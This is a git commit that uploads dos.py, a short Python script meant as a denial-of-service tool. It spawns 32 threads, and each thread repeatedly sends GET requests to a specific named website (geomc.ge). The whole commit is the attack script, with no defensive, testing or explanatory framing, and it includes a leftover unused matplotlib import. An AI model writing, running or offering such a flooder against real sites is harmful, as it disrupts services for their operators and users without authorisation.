442855d850ff207131c4e8e3399d5a5ee6586e62
tengolomidze <88274495+tengolomidze@users.noreply.github.com>
2022-08-16 17:47:37 +0400

    Add files via upload

---
+++ dos.py
@@ -0,0 +1,20 @@
+from matplotlib.pyplot import get
+import requests, threading, time;
+
+REQUESTS =64;
+THREADS = 32;
+
+def Start():
+    for i in range(0, THREADS):
+        newThread = threading.Thread(target=Get, args=[i])
+        newThread.start()
+
+def Get(i):
+    for j in range(0, REQUESTS):
+        try:
+            r = requests.get("https://geomc.ge/")
+            print(r)
+        except:
+            print("Falied.")
+    
+Start()
